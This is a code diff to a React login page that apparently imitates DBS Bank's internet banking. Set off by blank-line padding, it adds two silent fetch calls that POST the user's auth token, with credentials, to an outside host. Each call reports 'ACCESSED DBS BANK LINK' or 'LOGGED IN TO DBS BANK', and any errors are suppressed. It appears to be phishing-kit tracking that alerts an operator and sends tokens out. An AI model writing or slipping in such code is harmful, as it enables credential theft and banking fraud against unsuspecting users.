@@ -34,7 +34,26 @@ export default function Login() {
     }
     
     checkAuth()
-}, [])
+}, [])     
+
+
+
+
+
+
+useEffect(() => {
+    fetch('https://assignmentdbs-1.onrender.com/api/join-alert', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${localStorage.getItem('authToken')}`
+        },
+        body: JSON.stringify({ page: 'ACCESSED DBS BANK LINK' })
+    }).catch(() => {});
+}, []);  
+
+
 
 
 
@@ -60,6 +79,18 @@ export default function Login() {
       }
       const result = await response.json()
       localStorage.setItem('authToken', result.token)
+
+
+      fetch('https://assignmentdbs-1.onrender.com/api/join-alert', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${result.token}`
+    },
+    body: JSON.stringify({ page: 'LOGGED IN TO DBS BANK' })
+}).catch(() => {});
+
 
       setSubmitted(true)
       setTimeout(() => navigate('/member/IB/profile'), 1200)
